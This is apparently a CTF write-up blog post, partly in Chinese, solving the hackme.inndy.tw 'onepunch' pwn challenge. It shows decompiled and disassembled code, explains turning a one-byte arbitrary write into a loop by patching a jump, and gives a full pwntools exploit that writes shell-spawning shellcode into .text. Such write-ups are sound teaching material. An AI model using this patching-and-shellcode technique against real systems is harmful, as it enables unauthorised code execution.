---
title: hackme.inndy.tw::onepunch
date: 2021-10-17 21:18:49
tags: 
    - pwn
    - write ups
---

## challenge
```
nc hackme.inndy.tw 7718

Punch!
```
## 保護機制
Partial RELRO, NX, Canary
## 分析
main:
<!-- more -->
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-18h]
  int v5; // [rsp+Ch] [rbp-14h]
  _BYTE *v6; // [rsp+10h] [rbp-10h]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  printf("Where What?", 0LL);
  v5 = __isoc99_scanf("%llx %d", &v6, &v4);
  if ( v5 != 2 )
    return 0;
  *v6 = v4;
  if ( v4 == 255 )
    puts("No flag for you");
  return 0;
}
```
先是讀一個pointer和int, 接著把pointer指向的地方改成輸入的數字

因此我們拿到了一個Arbitrary Write, 但只有一次

assembly code:

```asm
156: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_18h @ rbp-0x18
│           ; var uint32_t var_14h @ rbp-0x14
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t canary @ rbp-0x8
│           0x004006f2      55             push rbp
│           0x004006f3      4889e5         mov rbp, rsp
│           0x004006f6      4883ec20       sub rsp, 0x20
│           0x004006fa      64488b042528.  mov rax, qword fs:[0x28]
│           0x00400703      488945f8       mov qword [canary], rax
│           0x00400707      31c0           xor eax, eax
│           0x00400709      488b05480920.  mov rax, qword [obj.stdout] ; rdi
│                                                                      ; [0x601058:8]=0                          
│           0x00400710      be00000000     mov esi, 0                  ; char *buf
│           0x00400715      4889c7         mov rdi, rax                ; FILE *stream
│           0x00400718      e863feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x0040071d      bf14084000     mov edi, str.Where_What     ; 0x400814 ; "Where What?" ; const char *format                                                                                                            
│           0x00400722      b800000000     mov eax, 0
│           0x00400727      e864feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040072c      488d55e8       lea rdx, qword [var_18h]
│           0x00400730      488d45f0       lea rax, qword [var_10h]
│           0x00400734      4889c6         mov rsi, rax
│           0x00400737      bf20084000     mov edi, str.llx__d         ; 0x400820 ; "%llx %d" ; const char *format                                                                                                                
│           0x0040073c      b800000000     mov eax, 0
│           0x00400741      e86afeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00400746      8945ec         mov dword [var_14h], eax
│           0x00400749      837dec02       cmp dword [var_14h], 2
│       ┌─< 0x0040074d      7407           je 0x400756
│       │   0x0040074f      b800000000     mov eax, 0
│      ┌──< 0x00400754      eb22           jmp 0x400778
│      ││   ; CODE XREF from main @ 0x40074d
│      │└─> 0x00400756      488b45f0       mov rax, qword [var_10h]
│      │    0x0040075a      8b55e8         mov edx, dword [var_18h]
│      │    0x0040075d      8810           mov byte [rax], dl
│      │    0x0040075f      8b45e8         mov eax, dword [var_18h]
│      │    0x00400762      3dff000000     cmp eax, 0xff               ; 255
│      │┌─< 0x00400767      750a           jne 0x400773
│      ││   0x00400769      bf28084000     mov edi, str.No_flag_for_you ; 0x400828 ; "No flag for you" ; const char *s                                                                                                            
│      ││   0x0040076e      e8edfdffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   ; CODE XREF from main @ 0x400767
│      │└─> 0x00400773      b800000000     mov eax, 0
│      │    ; CODE XREF from main @ 0x400754
│      └──> 0x00400778      488b4df8       mov rcx, qword [canary]
│           0x0040077c      6448330c2528.  xor rcx, qword fs:[0x28]
│       ┌─< 0x00400785      7405           je 0x40078c
│       │   0x00400787      e8e4fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x400785
│       └─> 0x0040078c      c9             leave
└           0x0040078d      c3             ret
```
`0x400773 = 0x400767 + 0xa +2` (注意+2因為RIP已經讀完這兩個byte)
所以我們可以先把0x00400767 的jne 0x400773 改成跳到main裡面

這樣就可以成為無限迴圈(因為v4永遠不會等於255, 0xff 是無效的opcode)

利用方式
有了無限迴圈之後, 就可以寫值了

只要最後把它再次patch回去就好

因為可以將`v6`的值改成 `v4`, 我們可以逐byte寫入shellcode(注意v4是int)

接下來是要想寫到哪一段記憶體, 因為有NX, 可以考慮寫到.text

## exploit
```python
#!/usr/bin/env python2


from pwn import *
import time

#context.log_level = 'debug'
context.arch = 'amd64'

base = 0x00400790 # __libc_csu_init

p = remote('hackme.inndy.tw', 7718)

p.sendlineafter('Where What?', '0x400768 137')
# time.sleep(0.5)
# p.sendline('0x400763 -2')
sc = asm(shellcraft.sh())
for i in range(len(sc)):
    time.sleep(0.5)
    p.sendline(hex(base + i) + ' ' + str(ord(sc[i])))
    print '[+] Wrote %d bytes to .text' % (i + 1)

print '[+] Wrote shellcode to .text'
p.sendline('0x400768 39')

p.interactive()
p.close()
```

